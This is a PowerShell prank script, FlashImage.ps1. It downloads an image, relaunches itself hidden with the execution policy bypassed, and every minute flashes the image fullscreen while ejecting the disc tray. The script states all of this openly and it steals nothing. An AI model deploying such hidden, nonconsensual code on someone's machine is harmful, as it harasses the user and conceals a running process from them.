# ===============================
# FlashImage.ps1
# Shows an image fullscreen briefly every minute,
# opens the optical drive tray at the same time,
# and runs hidden when launched.
# ===============================

param (
    [switch]$hidden
)

# Image URL and temp file path
$imageUrl = "https://i.pinimg.com/474x/21/16/52/2116522adaec37f9cc10f857f6f8b868.jpg"
$tempImage = "$env:TEMP\temp_image.jpg"

# Download image if missing
if (-not (Test-Path $tempImage)) {
    try {
        Invoke-WebRequest -Uri $imageUrl -OutFile $tempImage -ErrorAction Stop
    } catch {
        Write-Host "Failed to download image: $_"
    }
}

# Relaunch hidden if not already
if (-not $hidden) {
    $args = "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -hidden"
    Start-Process powershell -WindowStyle Hidden -ArgumentList $args
    exit
}

# Load .NET assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- Function to open optical drive tray ---
function Open-Tray {
    try {
        (New-Object -ComObject WMPlayer.OCX.7).cdromCollection.Item(0).Eject()
    } catch {
        # Ignore if no drive or error
    }
}

# --- Function to show image briefly ---
function Show-Image {
    try {
        $form = New-Object Windows.Forms.Form
        $form.FormBorderStyle = 'None'
        $form.WindowState = 'Maximized'
        $form.TopMost = $true
        $form.BackColor = 'Black'

        $img = [Drawing.Image]::FromFile($tempImage)
        $pictureBox = New-Object Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.SizeMode = 'Zoom'
        $pictureBox.Dock = 'Fill'
        $form.Controls.Add($pictureBox)

        # Open tray at the same time as showing image
        Open-Tray
        $form.Show()
        Start-Sleep -Milliseconds 200
        $form.Close()

        $img.Dispose()
    } catch {}
}

# --- Main loop ---
while ($true) {
    Show-Image
    Start-Sleep -Seconds 60
}
